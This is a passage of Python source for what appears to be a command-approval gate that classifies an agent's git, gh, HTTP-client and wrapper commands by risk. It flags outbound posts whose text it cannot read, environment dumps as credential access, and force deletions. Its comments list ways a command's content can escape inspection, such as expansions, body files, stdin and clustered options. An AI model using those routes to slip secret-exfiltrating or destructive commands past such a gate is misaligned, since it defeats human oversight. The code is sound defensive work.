    if sub == "branch" and _has(rest, "-D") or (sub == "branch" and "--delete" in rest and "--force" in rest):
        return _make("history_rewrite", summary="force-delete a local branch", command=cmd)
    if sub == "clean" and _has(rest, "-f", "--force"):
        return _make("delete", summary="git clean -f", command=cmd)
    if sub in ("checkout", "restore") and ("." in rest or "--" in rest) and not _has(rest, "-b", "-B", "--staged"):
        return _make("history_rewrite", summary=f"git {sub} discards local changes", command=cmd)
    if sub == "stash" and rest[:1] and rest[0] in ("drop", "clear"):
        return _make("history_rewrite", summary=f"git stash {rest[0]}", command=cmd)
    if sub == "tag" and _has(rest, "-d"):
        return _make("history_rewrite", summary="delete a tag", command=cmd)
    if sub in ("status", "log", "diff", "show", "fetch", "branch", "remote", "rev-parse", "blame", "ls-files",
               "grep", "describe", "shortlog", "reflog", "rev-list", "cat-file", "ls-remote", "ls-tree", "version",
               "help", "merge-base", "name-rev", "check-ignore", "count-objects"):
        return _make("read", summary=f"git {sub}", command=cmd)
    return _make("local_write", summary=f"git {sub}".strip(), command=cmd)


def _gh_target(argv: list[str]) -> tuple[str, str]:
    """(repo or url target, link) from `-R owner/repo`, a GitHub URL, or a number."""
    repo = _opt(argv, "-R", "--repo") or ""
    number = ""
    link = ""
    for a in argv[3:]:
        m = _GH_URL.match(a)
        if m:
            repo, number, link = m.group(1), m.group(2) or "", a
            break
        if re.fullmatch(r"#?\d+", a) and not number:
            number = a.lstrip("#")
    if not repo and len(argv) > 3 and argv[1] == "repo" and re.fullmatch(r"[\w.-]+/[\w.-]+", argv[3]):
        repo = argv[3]
    if not link and repo and number:
        link = f"https://github.com/{repo}/issues/{number}"
    elif not link and repo:
        link = f"https://github.com/{repo}"
    target = f"{repo}#{number}" if repo and number else (repo or (f"#{number}" if number else ""))
    return target, link


def _gh_text_options(group: str) -> tuple:
    """The options that carry a gh post's text: body (or release notes), its file, and the title."""
    if group == "release":
        return ("--notes", "-n"), ("--notes-file", "-F"), ("--title", "-t")
    return ("--body", "-b"), ("--body-file", "-F"), ("--title", "-t")


def _gh_unseen(argv: list[str], stdin: str | None, dynamic: frozenset) -> bool:
    """Whether a gh post's text is not all on the line as the gate read it (#208): a word from an expansion
    (any word can be an option, `--body-file=f` included), a text option the gate's reading and gh's disagree
    on (gh takes the last of a repeated option, and short options cluster: `-db text`), a body file `-` with no
    literal stdin, a body gh builds itself (`--fill`, a template, the editor, generated notes), a gist's files,
    or a `gh api` request body or field read from a file (`--input`, `field=@path`)."""
    group, verb = (argv + ["", ""])[1:3]
    if any(i in dynamic for i in range(1, len(argv))) or group == "gist":
        return True
    if group == "api":
        fields = _option_values(argv, _GH_API_FIELDS, takes=_GH_API_TAKES, least=99)
        return _opt(argv, "--input") is not None or any(f.partition("=")[2].startswith("@") for f in fields)
    if verb in ("close", "reopen") and group in ("pr", "issue"):
        # A close or reopen posts its --comment with it (#326, #397): unseen when the gate's read of it and gh's
        # disagree (a repeat, a cluster, an attached form), as for a post's body (#208).
        takes_c, longs_c = _GH_TAKES.get((group, verb), ("", ""))
        values = _option_values(argv, ("--comment", "-c"), takes=takes_c,
                                longs=tuple(longs_c.split()) + ("--comment",), least=99)
        comment = _opt(argv, "--comment", "-c")
        if not values and comment is None:
            return False  # no comment: the close posts nothing but itself
        return values != ([] if comment is None else [comment])
    if verb == "merge" and group == "pr":
        # A merge's subject is its title: -t is covered by the generic read below, --subject is not.
        takes_m, longs_m = _GH_TAKES.get((group, verb), ("", ""))
        subject = _opt(argv, "--subject", "-t")
        values = _option_values(argv, ("--subject", "-t"), takes=takes_m,
                                longs=tuple(longs_m.split()) + ("--subject",), least=99)
        if values != ([] if subject is None else [subject]):
            return True
    takes, longs = _GH_TAKES.get((group, verb), ("", ""))
    body, body_file, title = _gh_text_options(group)
    # The text options take a value too: in `--title --body --body x` the title is `--body` and the body `x`.
    longs_all = tuple(longs.split()) + tuple(n for names in (body, body_file, title) for n in names if n[:2] == "--")
    for names in (body, body_file, title):
        got = _opt(argv, *names)
        if _option_values(argv, names, takes=takes, longs=longs_all, least=99) != ([] if got is None else [got]):
            return True
    if _opt(argv, *body_file) == "-" and stdin is None:
        return True
    flags = _GH_UNSEEN_FLAGS.get((group, verb), ())
    return _has(argv, *flags) or any(a.startswith(f + "=") for a in argv for f in flags if f.startswith("--"))


def _classify_gh(argv: list[str], cmd: str, stdin: str | None = None,
                 dynamic: frozenset = frozenset()) -> Classification:
    """A gh command. ``stdin`` is its stdin when the line spells it out (`_literal_stdin`), ``dynamic`` the
    indexes of words that come from an expansion. An outbound post whose text the gate cannot fully read
    carries the ``unseen_body`` signal (#208)."""
    c = _gh_kind(argv, cmd, stdin)
    gist = c.category == "remote_write" and argv[1:2] == ["gist"]          # a secret gist's create or edit
    gh_close = c.category == "github_close" and (argv + ["", ""])[1:3] in (["pr", "close"], ["issue", "close"])
    if (c.category in OUTBOUND or gist or gh_close or c.category == "vcs_merge") and _gh_unseen(argv, stdin, dynamic):
        c.signals.append("unseen_body")
    return c


def _gh_kind(argv: list[str], cmd: str, stdin: str | None) -> Classification:
    group = argv[1] if len(argv) > 1 else ""
    verb = argv[2] if len(argv) > 2 else ""
    if group and group not in _GH_GROUPS:
        return _opaque(f"gh {group} (an alias or extension the gate cannot see)", cmd)
    target, link = _gh_target(argv)
    body_opt, file_opt, title_opt = _gh_text_options(group)
    body = _opt(argv, *body_opt) or ""
    title = _opt(argv, *title_opt) or ""
    body_file = (_opt(argv, *file_opt) or "") if group != "api" else ""
    if body_file == "-":
        body_file = ""
        if stdin is not None and not body:
            body = stdin
    kw = dict(target=target, link=link, text=body, title=title, text_file=body_file, command=cmd)
    where = f" on {target}" if target else ""
    if verb in ("close", "reopen") and group in ("pr", "issue"):
        comment = _opt(argv, "--comment", "-c")  # a close or reopen posts this text with it (#326, #397)
        if comment is not None:
            kw["text"] = comment
    if verb == "merge" and group == "pr":
        subject = _opt(argv, "--subject")  # the merge commit's subject; -t already lands in title
        if subject is not None:
            kw["title"] = subject
    if group == "auth" or group == "secret" or (group == "ssh-key" and verb in ("add", "delete")):
        return _make("credentials", summary=f"gh {group} {verb}", **kw)
    if group == "api":
        method = (_opt(argv, "-X", "--method") or "").upper()
        # Read as gh reads them, so an attached value (`-fbody=x`) makes it a POST too (#208).
        fields = _option_values(argv, _GH_API_FIELDS, takes=_GH_API_TAKES, least=99)
        if not method:
            method = "POST" if fields or _opt(argv, "--input") else "GET"
        endpoint = next((a for a in argv[2:] if not a.startswith("-") and "/" in a and "=" not in a), "")
        m = re.search(r"repos/([\w.-]+/[\w.-]+)", endpoint)
        api_target = m.group(1) if m else endpoint
        kw.update(target=api_target, link=f"https://github.com/{m.group(1)}" if m else "")
        for f in fields:
            k, _, v = f.partition("=")
            if k in ("body", "text", "message") and not v.startswith("@"):
                kw["text"] = v
            elif k == "title":
                kw["title"] = v
        if method == "GET":
            return _make("read", summary=f"gh api GET {endpoint}", **kw)
        if method == "DELETE":
            return _make("delete", exposure="public", summary=f"gh api DELETE {endpoint}", **kw)
        return _make("github_post", summary=f"gh api {method} {endpoint}", **kw)
    if group in ("pr", "issue", "discussion"):
        if verb in ("comment", "review", "create", "edit", "ready", "reopen", "develop", "transfer", "lock", "unlock"):
            label = {"pr": "PR", "issue": "issue", "discussion": "discussion"}[group]
            what = f"{label} {verb}" if verb != "create" else f"new {label}"
            return _make("github_post", summary=f"GitHub {what}{where}", **kw)
        if verb == "merge":
            return _make("vcs_merge", summary=f"merge PR{where}", **kw)
        if verb == "close":
            return _make("github_close", summary=f"close {group}{where}", **kw)
        if verb == "delete":
            return _make("delete", exposure="public", third_party=True, summary=f"delete {group}{where}", **kw)
        return _make("read", summary=f"gh {group} {verb}", **kw)
    if group == "release":
        if verb in ("create", "edit", "upload"):
            return _make("publish", summary=f"GitHub release {verb}{where}", **kw)
        if verb == "delete" or verb == "delete-asset":
            return _make("delete", exposure="public", summary=f"delete release{where}", **kw)
        return _make("read", summary=f"gh release {verb}", **kw)
    if group == "repo":
        if verb == "delete":
            return _make("delete", exposure="public", summary=f"delete repo{where}", **kw)
        if verb == "archive":
            return _make("github_close", summary=f"archive repo{where}", **kw)
        if (verb == "create" and "--public" in argv) or (verb == "edit" and _opt(argv, "--visibility") == "public"):
            return _make("publish", summary=f"make a public repo{where}", **kw)
        if verb in ("create", "edit", "rename", "fork"):
            return _make("vcs_admin", summary=f"gh repo {verb}{where}", **kw)
        return _make("read", summary=f"gh repo {verb}", **kw)
    if group == "gist" and verb in ("create", "edit"):
        exposure = "public" if "--public" in argv or "-p" in argv else "internal"
        return _make("publish" if exposure == "public" else "remote_write", exposure=exposure,
                     summary=f"gist {verb}", **kw)
    if group == "workflow" and verb in ("run", "enable", "disable"):
        return _make("remote_write", summary=f"gh workflow {verb}", **kw)
    if group in ("label", "variable", "ruleset", "cache") and verb in ("create", "edit", "delete", "set", "clone"):
        return _make("vcs_admin", summary=f"gh {group} {verb}", **kw)
    return _make("read", summary=f"gh {group} {verb}".strip(), **kw)


def _http_unseen(prog: str, argv: list[str], dynamic: frozenset, fed: bool) -> bool:
    """Whether an HTTP client's request body is not all on the line (#208): a word from an expansion other than
    a header or login value, a body read from a file or stdin (curl `-d @f`, `-F k=@f`, `-F k=<f`, `-T`, `-K`;
    wget `--post-file`; httpie `k=@f`, `k:=@f`, `k@f` or a fed stdin)."""
    meta = _HTTP_META.get(prog, ())
    exempt = {i + 1 for i, a in enumerate(argv) if a in meta}
    exempt |= {i for i, a in enumerate(argv) if any(a.startswith(m + "=") for m in meta if m.startswith("--"))}
    if any(i in dynamic and i not in exempt for i in range(1, len(argv))):
        return True
    if prog == "curl":
        values = lambda *names: _option_values(argv, names, least=99)  # noqa: E731
        return bool(values("-T", "--upload-file") or values("-K", "--config") or values("--expand-data")
                    or any(v.startswith("@") for v in values("-d", "--data", "--data-binary", "--data-ascii", "--json"))
                    or any(re.match(r"[^=]*@", v) for v in values("--data-urlencode"))
                    or any(re.match(r"[^=]*=[@<]", v) for v in values("-F", "--form")))
    if prog == "wget":
        return _opt(argv, "--post-file", "--body-file", "--config", "--execute", "-e") is not None
    return (fed and not _has(argv, "--ignore-stdin", "-I")) or any(re.match(r"[\w.-]+(=@|:=@|@)", a) for a in argv[1:])


def _classify_http(argv: list[str], cmd: str, dynamic: frozenset = frozenset(), fed: bool = False) -> Classification:
    """curl, wget or httpie. A post whose body the gate cannot fully read carries ``unseen_body`` (#208)."""
    c = _http_kind(argv, cmd)
    if c.category == "web_post" and _http_unseen(argv[0], argv, dynamic, fed):
        c.signals.append("unseen_body")
    return c


def _http_kind(argv: list[str], cmd: str) -> Classification:
    prog = argv[0]
    urls = [a for a in argv[1:] if _URL.match(a)]
    if not urls:
        urls = [a for a in argv[1:] if not a.startswith("-") and "=" not in a
                and ("." in a or re.match(r"(localhost|\[::1\])(:\d+)?(/|$)", a))][:1]
    url = urls[0] if urls else ""
    host = _host_of(url) if url else ""
    method, data = "GET", ""
    # curl -K reads options, data and URLs from a file the gate does not read: a request it cannot see (#208).
    config = prog == "curl" and bool(_option_values(argv, ("-K", "--config"), least=99))
    if prog == "curl":
        method = (_opt(argv, "-X", "--request") or "").upper()
        datas = _option_values(argv, _DATA_FLAGS, least=99)   # an attached value (`-d@f`) is a POST too (#208)
        data = " ".join(datas)
        if not method:
            method = "POST" if datas or _has(argv, "-T", "--upload-file") else "GET"
        if _has(argv, "-I", "--head"):
            method = "HEAD"
        if config and method in ("GET", "HEAD", "OPTIONS"):
            method = "POST"
    elif prog == "wget":
        method = (_opt(argv, "--method") or "").upper() or ("POST" if _opt(argv, "--post-data", "--post-file") else "GET")
        data = _opt(argv, "--post-data") or ""
    elif prog in ("http", "https", "xh", "httpie"):
        m = next((a.upper() for a in argv[1:3] if a.upper() in ("GET", "POST", "PUT", "PATCH", "DELETE")), "")
        fields = [a for a in argv[1:] if re.match(r"^[\w.-]+(:=|=|@)", a)]
        method = m or ("POST" if fields else "GET")
        data = " ".join(fields)
    kw = dict(target=host, link=url, command=cmd, text=data)
    if method in ("GET", "HEAD", "OPTIONS"):
        return _make("web_read", summary=f"{method} {host or url}", **kw)
    if host and _is_local_host(host) and not config:   # a host the gate cannot read is not local (#208)
        return _make("local_write", summary=f"{method} to local service {host or url}", **kw)
    return _make("web_post", summary=f"{method} to {host}", **kw)


def _strip_prefix_words(words: list) -> tuple[list, bool, str | None]:
    """Drop assignments and prefix commands (sudo, env, timeout...). Returns (words, sudo, env -S text).
    env and sudo read NAME=VALUE from their own argv, so after them a quoted one is an assignment too."""
    sudo = own_argv = False
    while words:
        t = words[0].text
        if (own_argv or not words[0].quoted) and _ASSIGN.fullmatch(t):
            words = words[1:]
            continue
        base = t.rsplit("/", 1)[-1]
        if words[0].dynamic or base not in _PREFIXES:
            break
        if base == "command" and words[1:2] and words[1].text in ("-v", "-V"):
            break
        sudo = sudo or base in ("sudo", "doas")
        own_argv = base in ("env", "sudo")
        takes, words = _PREFIXES[base], words[1:]
        while words and words[0].text.startswith("-") and words[0].text != "-":
            f = words[0].text
            words = words[1:]
            if base == "env" and (f in ("-S", "--split-string") or f.startswith(("--split-string=", "-S"))):
                inline = f.split("=", 1)[1] if "=" in f else (f[2:] if f.startswith("-S") and len(f) > 2 else "")
                return [], sudo, inline or " ".join(w.text for w in words)
            if f in takes and words:
                words = words[1:]
        if base == "timeout" and words and re.fullmatch(r"[\d.]+[smhd]?", words[0].text):
            words = words[1:]
    return words, sudo, None


def _wrapper_args(argv: list[str], i: int, takes: tuple, permute: bool = False) -> tuple[int, list]:
    """Read a wrapper's options from argv[i] as getopt does: up to the first operand (past it with `permute`)
    or `--`, `--opt=value` or `--opt value` (an unambiguous prefix of four letters or more counts), short
    options clustered (`-qc`, `-n5`). Returns the index of the first operand and the (option, value) pairs read."""
    seen: list[tuple[str, str]] = []
    while i < len(argv):
        a = argv[i]
        i += 1
        if a == "--":
            break
        if not a.startswith("-") or a == "-":
            if not permute:
                return i - 1, seen
        elif a.startswith("--"):
            name, eq, val = a.partition("=")
            full = [t for t in takes if len(name) > 5 and t.startswith(name) and not t.endswith("=")]
            name = name if name in takes or len(full) != 1 else full[0]
            if not eq and name in takes and i < len(argv):
                val, i = argv[i], i + 1
            seen.append((name, val))
        else:
            for k, ch in enumerate(a[1:], 2):
                if "-" + ch in takes or "-" + ch + "=" in takes:
                    val = a[k:]
                    if not val and "-" + ch in takes and i < len(argv):
                        val, i = argv[i], i + 1
                    seen.append(("-" + ch, val))
                    break
                seen.append(("-" + ch, ""))
    return i, seen


def _classify_wrapper(prog: str, words: list, cmd: str, depth: int, inner_words) -> list[Classification]:
    """A wrapper that runs a command (#160): setsid, flock, chroot, watch, script -c, tmux, screen, parallel...
    The command is classified as a nested command beside an opaque part, like the command after xargs: the line
    asks as before, and a deny on what runs applies when its category outranks opaque_exec (until D-075). A
    command the gate cannot find or read stays opaque."""
    argv = [w.text for w in words]
    head = _opaque(f"{prog}: {_OPAQUE_PROGRAMS.get(prog, 'runs a command')}", cmd)
    parts, texts, rest = [head], [], []
    if prog == "screen":
        multi = {"-Logfile": "--logfile", "-ls": "-Q", "-list": "-Q", "-wipe": "-Q", "-fn": "--fn", "-fa": "--fa",
                 "-ln": "--ln"}
        i, seen = _wrapper_args([multi.get(a, a) for a in argv], 1, _WRAPPERS[prog] + ("--logfile",))
        opts = {o for o, _ in seen}
        # -r and -x reattach, -ls, -wipe and -Q query: nothing new runs. -R reattaches, or starts the command when
        # no session is detached; it is not read and asks (a known limit). -X sends a screen command; its
        # `screen` command opens a window that runs argv. Otherwise the argv after the options runs.
        if "-X" not in opts and not {"-r", "-R", "-x", "-Q"} & opts:
            rest = words[i:]
        elif "-X" in opts and argv[i:i + 1] == ["screen"]:
            j, _ = _wrapper_args(argv, i + 1, ("-t", "-T", "-h"))
            rest = words[j + 1:] if argv[j:j + 1] and argv[j].isdigit() else words[j:]
    elif prog == "tmux":
        i, seen = _wrapper_args(argv, 1, _WRAPPERS[prog])
        texts = [v for o, v in seen if o == "-c"]
        # A command list, split as tmux splits it (cmd_parse_from_arguments): an argument whose last character is
        # `;` ends a command and loses the `;` (`';'`, `'sleep 3;'`); one ending in `\;` does not end it and
        # reads as ending in `;`.
        cmds: list[list[str]] = [[]]
        for a in argv[i:]:
            if a.endswith("\\;"):
                cmds[-1].append(a[:-2] + ";")
            elif a.endswith(";"):
                cmds[-1] += [a[:-1]] if a[:-1] else []
                cmds.append([])
            else:
                cmds[-1].append(a)
        for sub_argv in cmds:
            sub = _TMUX_ALIASES.get(sub_argv[0], sub_argv[0]) if sub_argv else ""
            if sub in _TMUX_RUNS:
                j, flags = _wrapper_args(sub_argv, 1, tuple("-" + c for c in _TMUX_RUNS[sub]))
                body = sub_argv[j:]
                if body and not (sub == "run-shell" and ("-C", "") in flags):
                    texts.append(body[0] if len(body) == 1 else shlex.join(body))
    elif prog == "parallel":
        i, _ = _wrapper_args(argv, 1, _WRAPPERS[prog])
        seps = (":::", "::::", ":::+", "::::+")
        j = next((k for k in range(i, len(argv)) if argv[k] in seps), len(argv))
        template = " ".join(argv[i:j])
        if template:
            # Each argument is appended to the template, or put where {} stands, and the line runs in a shell.
            # Only on the line itself and up to four times this command's own length, sized before any text is
            # built: a template can be a parallel line too, and reading every argument at each level would
            # multiply the work. The template is also read alone.
            args = argv[j + 1:] if argv[j:j + 1] == [":::"] and not depth else []
            args = list(dict.fromkeys(args[:next((n for n, a in enumerate(args) if a in seps), len(args))]))[:16]
            budget, slots = 4 * sum(len(a) + 1 for a in argv), template.count("{}")
            for a in args if slots or "{" not in template else []:
                q = shlex.quote(a)
                budget -= len(template) + (slots * (len(q) - 2) if slots else len(q) + 1)
                if budget < 0:
                    break
                texts.append(template.replace("{}", q) if slots else f"{template} {q}")
            texts.append(template)
    else:
        i, seen = _wrapper_args(argv, 1, _WRAPPERS[prog], permute=prog == "script")
        texts = [v for o, v in seen if prog in ("flock", "script") and o in ("-c", "--command")]
        i += _WRAPPER_OPERANDS.get(prog, 0)
        if prog == "flock" and argv[i:i + 1] in (["-c"], ["--command"]):
            texts.append(argv[i + 1] if i + 1 < len(argv) else "")
        elif prog == "watch" and not {("-x", ""), ("--exec", "")} & set(seen):
            texts.append(" ".join(argv[i:]))         # watch runs the words joined through `sh -c`
        elif prog != "script":
            rest = words[i:]
    for text in texts:
        parts.append(classify_shell(text, depth + 1) if depth < _DEPTH else _too_deep(cmd))
    parts += inner_words(rest)
    if _env_dump(_strip_prefixes_keep_env([w.text for w in rest])[0]):   # as for coproc and the prefixes (#155)
        parts.append(_make("credentials", summary="shell touching environment dump", command=cmd,
                           signals=["secret store"]))
    shown = " ".join(w.text for w in rest) or "; ".join(t for t in texts if t)
    if shown:
        head.summary = f"{prog} runs {shown}"[:120]
    if prog in _PRIVILEGED_WRAPPERS:
        head.signals.append(prog)
        for p in parts:
            p.reversibility = "costly" if p.reversibility == "reversible" else p.reversibility
    return parts


def _trusted_path(prog: str) -> bool:
    """A program named by path runs as itself only from a system bin folder or a virtualenv/node bin."""
    p = _expand_text(prog)
    if _ENV_BIN.search(p):
        return True
    return p.startswith("/") and os.path.dirname(os.path.normpath(p)) in _SYSTEM_BIN


def _expands(w: _Word) -> bool:
    """Whether bash may turn a word into other text or into several words (#208): a `$` expansion or backticks,
    a brace expansion (`Zo{r,}k`, `{1..3}`), a glob character, or a leading `~`. `{owner}` with no comma or
    `..` stays as it is."""
    return (w.dynamic or w.raw.startswith("~") or (w.glob and bool(re.search(r"[*?\[]", w.text)))
            or (w.brace and bool(re.search(r"\{[^}]*(,|\.\.)[^}]*\}", w.text))))


def _literal_stdin(k: _Cmd, piped: str | None) -> str | None:
    """A command's stdin when the line spells it out and bash changes nothing in it (#208): its one heredoc with
    a quoted delimiter, or with no `$`, backtick or backslash in the body (bash expands those and joins a line
    ending in `\\`); its one here-string with no expansion; or ``piped``, what `_literal_pipe` read from the one
    simple command writing the pipe. None for a `<` redirection, more than one source, or a stdin the gate
    cannot see (a compound's, `exec <`, the tool's own)."""
    docs = [h for h in k.heredocs if not h.fd.lstrip("0")]          # a heredoc on fd 3 is not stdin
    strings = [w for w in k.herestrings if not w.fd.lstrip("0")]
    if any(op in _READ_REDIRS for op, _ in k.redirs) or len(docs) + len(strings) > 1:
        return None
    if docs:
        h = docs[0]
        return h.body if not h.ambiguous and (h.quoted or not re.search(r"[$`\\]", h.body)) else None
    if strings:
        return None if _expands(strings[0]) else strings[0].text
    return piped


def _literal_pipe(w: _Cmd | None) -> str | None:
    """What one simple command writes to a pipe, when bash and the program change nothing in it (#208): `cat`
    with no arguments and a literal heredoc or here-string (`_literal_stdin`), `echo` with no option word and
    no backslash, or `printf` with one format and no `%` or backslash in it. Anything else (escapes, formats,
    options, a redirection, an expansion, another program) is None: the gate cannot tell what the pipe carries."""
    if w is None or w.redirs or not w.words or any(_expands(x) for x in w.words):
        return None
    prog, args = w.words[0].text, [x.text for x in w.words[1:]]
    if prog == "cat" and not args:
        return _literal_stdin(w, None)
    if w.heredocs or w.herestrings or "\\" in "".join(args):
        return None
    if prog == "echo" and not any(a.startswith("-") for a in args):
        return " ".join(args)
    if prog == "printf" and len(args) == 1 and "%" not in args[0] and not args[0].startswith("-"):
        return args[0]
    return None


def _stdin_texts(k: _Cmd, piped: str | None) -> list[str]:
    out = [h.body for h in k.heredocs] + [w.text for w in k.herestrings]
    if piped is not None:
        out.append(piped)
    return list(dict.fromkeys(out))


# A compound command's closing word, and the openers it closes.
_COMPOUND_CLOSERS = {"}": ("{",), "done": ("while", "until", "for", "select"), "fi": ("if",), "esac": ("case",)}
_COMPOUND_OPENERS = frozenset(o for names in _COMPOUND_CLOSERS.values() for o in names)
_READ_REDIRS = ("<", "<&", "<>")


def _command_word(words: list, lead: bool, pre: int) -> bool:
    """Whether the next word is in command position: only reserved words before it (lead, which the parser keeps
    so this is O(1)), or a `coproc [NAME]` or `function NAME` that starts at words[pre]."""
    return lead or (len(words) - pre <= 2 and not words[pre].quoted and words[pre].text in ("coproc", "function"))


def _own_stdin(k: _Cmd) -> bool:
    """Whether the command's own heredoc, here-string or `<` redirection sets its stdin. The lexer drops fd
    numbers, so `2<file` counts too: that command is not fed, as on main."""
    return bool(k.heredocs or k.herestrings) or any(op in _READ_REDIRS for op, _ in k.redirs)


def _sets_shell_stdin(k: _Cmd, fnames: set) -> bool:
    """Whether the compound's stdin stops being fed after this command. `exec < file` makes the file the
    stdin of every later command in that shell, and bash reaches it however exec is spelled or prefixed
    (`"exec"`, `\\exec`, `command exec`, `X=1 exec`, `time exec`) and unseen through eval, source, `.`, a
    program name from a variable or a function defined on the line. So any of those stops the feed, and
    the later commands keep main's reading."""
    w = next((w for w in k.words if not (w.text in _OPENERS or w.text in ("command", "time", "-p")
                                         or _ASSIGN.fullmatch(w.text))), None)
    if w is None:
        return False
    return (w.dynamic or w.text in ("eval", "source", ".") or w.text in fnames
            or (w.text == "exec" and _own_stdin(k)))


# Builtins and keywords after which the shell runs the rest of the line differently (#394): they set or export a
# variable, an option, an alias, a function, a coprocess, the hash table, a trap or the folder stack, or run a file
# in this shell. _STATE_ALWAYS do so whatever their arguments, _STATE_OPERANDS when given any (alone they print).
# eval is not here: the gate reads its text as a nested line, whose own setters count. cd is left out on purpose,
# so `cd repo && cmd` stays under an allow rule whose regex finds cmd in the line. That cannot loosen a decision,
# since the rule must still match the whole line (docs/GATE.md, Known limits).
_STATE_ALWAYS = frozenset({"source", ".", "read", "mapfile", "readarray", "getopts", "let", "pushd", "popd",
                           "for", "select", "function", "coproc"})
_STATE_OPERANDS = frozenset({"hash", "alias", "enable", "unset", "trap"})


def _sets_state(k: _Cmd) -> bool:
    """Whether the simple command changes the shell for the commands after it on the line (#394): an assignment with
    no command, `export X`, `declare X=1` (any of _EXPORTERS with an operand), `set` with -a, -k or operands,
    `shopt -s`/`-u`, `printf -v`, `exec` with only redirections, a program name the gate cannot read, or one of the
    builtins above. Such a state lasts only as long as the shell, so it changes what a later command on the same
    line runs (`export GIT_SSH_COMMAND=..; git push`) where a separate call would start afresh."""
    words = list(k.words)
    while words and not words[0].quoted and words[0].text in _OPENERS:
        words = words[1:]
    if not words:
        return False
    if all(_ASSIGN.fullmatch(w.text) for w in words):
        return True
    rest, _, split = _strip_prefix_words(words)
    if split is not None:
        return False                              # `env -S`: a command line, read as one
    if not rest:                                  # prefixes only: `exec 3>f` sets the fds later commands get
        return any(w.text.rsplit("/", 1)[-1] == "exec" for w in words)
    prog, args = rest[0], rest[1:]
    if prog.dynamic:
        return True
    name = prog.text
    if name in _EXPORTERS:
        return any(a.dynamic or not a.text.startswith(("-", "+")) for a in args)
    if name == "set":
        i = 0
        while i < len(args):
            t = args[i].text
            if args[i].dynamic or not re.fullmatch(r"[-+][A-Za-z]+", t) or set(t[1:]) & {"a", "k"}:
                return True                       # allexport, keyword, or new positional parameters (`set -- x`)
            if "o" in t:                          # `set -o NAME`: the same two by name
                i += 1
                if i < len(args) and (args[i].dynamic or args[i].text in ("allexport", "keyword")):
                    return True
            i += 1
        return False
    if name == "shopt":
        return any(a.dynamic or re.fullmatch(r"-[a-z]*[su][a-z]*", a.text) for a in args)
    if name == "printf":
        return bool(args) and (args[0].dynamic or args[0].text.startswith("-v"))
    return name in _STATE_ALWAYS or (name in _STATE_OPERANDS and bool(args))


def _feed_compound(cmds: list[_Cmd], start: int, closer: _Cmd, src: _Cmd | None, taken: dict,
                   fnames: set) -> None:
    """A compound command's stdin reaches the commands inside it: a heredoc or here-string after its
    closing `}`, `)`, `done`, `fi` or `esac`, and text piped into it. As in bash, a command whose stdin is
    already set keeps it: its own redirection, a pipe from a command inside, or a nested compound's closer
    or pipe (inner closers are fed first). After an `exec < file` inside, nothing more is fed. The closer's
    own redirection wins over a pipe in, and its `<` over its heredoc too (the lexer keeps no order between
    them), so then nothing is fed. Every other inner command gets all of it, an over-approximation: only
    shells, interpreters and gh read it."""
    if src is None and not _own_stdin(closer):
        return
    redirected = any(op in _READ_REDIRS for op, _ in closer.redirs)
    heredocs, texts = list(closer.heredocs), list(closer.herestrings)
    piped = _piped_text(src, taken) if src is not None and not _own_stdin(closer) else None
    if piped is not None:
        texts.append(_Word(piped))
    i, sets = start, False
    while i < len(cmds) and not sets:
        if i in taken:                  # a nested compound with its own stdin, skipped whole (linear)
            i, sets = taken[i]
            continue
        k = cmds[i]
        sets = _sets_shell_stdin(k, fnames)
        fed = not (sets or _own_stdin(k) or (i > start and k.piped_in))
        k.fed = k.fed or fed            # its own text does not name its stdin (#394)
        if fed and not redirected:
            k.heredocs, k.herestrings = heredocs, texts      # shared, so _once reads them once per line
        i += 1
    if len(cmds) > start:
        taken[start] = (len(cmds), sets)


def _once(ctx: dict, key: tuple, k: _Cmd, piped: str | None, read: Callable[[str], list[Classification]],
          ambiguous: bool = False, own: str | None | EllipsisType = ...) -> list[Classification]:
    """read(text) for each stdin text of k (each heredoc body after an ambiguous delimiter, if ambiguous), run
    once per command line and key. A compound's stdin reaches every command inside it (as the same lists), and
    each command still gets copies of the parts, since its own store check (_store_touch) reads them; the same
    lists again give the most severe part of each category, all that check and _combine look at. Without this a
    body of fed shells, itself fed to many shells, is read width ** depth times, and many here-strings fed to
    many shells cost their product.
    A reader whose parts carry its own text (#394) passes that text as ``own``. The text is then read with _READER
    in its place, and each reader gets copies with its own text there (_restamp): `{ psql -d test; psql -d prod; }
    <<EOF` gives psql -d prod parts with its own text. Each text is still read once per line, since every read
    spends the call's budgets (_brace_budget) and a second read could find them spent."""
    memo = ctx.setdefault("stdin", {})
    whole = (*key, id(k.heredocs), id(k.herestrings), piped, ambiguous)
    if whole in memo:
        return [_copy(_restamp(ctx, c, own)) for c in memo[whole]]
    got: list[Classification] = []
    for text in [h.body for h in k.heredocs if h.ambiguous] if ambiguous else _stdin_texts(k, piped):
        if (*key, text) not in memo:
            memo[(*key, text)] = read(text) if own is ... else _read_as_reader(read, text)
        got += memo[(*key, text)]
    memo[whole] = [max((p for p in got if p.category == c), key=_severity)
                   for c in dict.fromkeys(p.category for p in got)]
    return [_copy(_restamp(ctx, c, own)) for c in got]


def _read_as_reader(read: Callable[[str], list[Classification]], text: str) -> list[Classification]:
    """read(text), with _READER as the own text of each part it makes for the reading command (#394)."""
    slot = _own_text.get()
    if slot is None:
        return read(text)
    was, slot[0] = slot[0], _READER
    try:
        return read(text)
    finally:
        slot[0] = was


def _restamp(ctx: dict, c: Classification, own: str | None | EllipsisType) -> Classification:
    """``c``, a part _once stored, with ``own`` as the own text of each part in it that has _READER (#394). Only those
    parts and the parts built from them are copied, once per line for each part and own text: the many readers
    of a compound's stdin get the same few parts, and one of them may be built from many."""
    if own is ...:
        return c
    holds, done = ctx.setdefault("stand_in", {}), ctx.setdefault("restamped", {})

    def held(p: Classification) -> bool:
        if id(p) not in holds:
            holds[id(p)] = p.own is _READER or any([held(q) for q in p.parts])
        return holds[id(p)]

    def walk(p: Classification) -> Classification:
        if not held(p):
            return p
        if (id(p), own) not in done:
            done[(id(p), own)] = replace(p, parts=[walk(q) for q in p.parts], own=own if p.own is _READER else p.own)
        return done[(id(p), own)]
    return walk(c)


def _copy(c: Classification) -> Classification:
    """A part to hand out again: _combine and the callers change the one they get."""
    return replace(c, signals=list(c.signals), _command_views=list(c._command_views))


# Builtins that take a variable name and evaluate an array subscript in it as arithmetic, which runs any
# $( ) or ` ` there (#179): program -> (options whose value is a name, options with another value, operands are names).
_NAME_BUILTINS = {"printf": ("v", "", False), "read": ("a", "dinNptu", True), "declare": ("", "", True),
                  "typeset": ("", "", True), "local": ("", "", True), "unset": ("", "", True),
                  "wait": ("p", "", False), "test": ("v", "", False), "[": ("v", "", False),
                  "readonly": ("", "", True), "export": ("", "", True)}
